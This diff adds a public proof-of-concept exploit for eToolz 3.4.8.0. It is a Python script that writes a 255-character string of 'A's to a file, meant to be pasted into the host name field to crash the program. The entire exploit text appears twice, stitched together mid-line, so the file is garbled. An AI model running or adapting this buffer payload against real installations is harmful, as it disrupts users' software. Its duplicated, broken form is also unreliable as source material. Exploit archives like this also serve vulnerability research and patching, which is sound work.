@@ -1,0 +1,55 @@
+# Exploit Title: eToolz 3.4.8.0 - Denial of Service (PoC)
+# Dork: N/A
+# Date: 2018-11-03
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://www.gaijin.at
+# Software Link: https://www.gaijin.at/de/software/etoolz
+# Version: 3.4.8.0
+# Category: Dos
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# Host name / IP adress :
+
+#!/usr/bin/python
+    
+buffer = "A" * 255
+ 
+payload = buffer
+try:
+    f=open("exp.txt","w")
+    print "[+] Creating %s bytes evil payload." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created."# Exploit Title: eToolz 3.4.8.0 - Denial of Service (PoC)
+# Dork: N/A
+# Date: 2018-11-03
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://www.gaijin.at
+# Software Link: https://www.gaijin.at/de/software/etoolz
+# Version: 3.4.8.0
+# Category: Dos
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# Host name / IP adress :
+
+#!/usr/bin/python
+    
+buffer = "A" * 255
+ 
+payload = buffer
+try:
+    f=open("exp.txt","w")
+    print "[+] Creating %s bytes evil payload." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created."
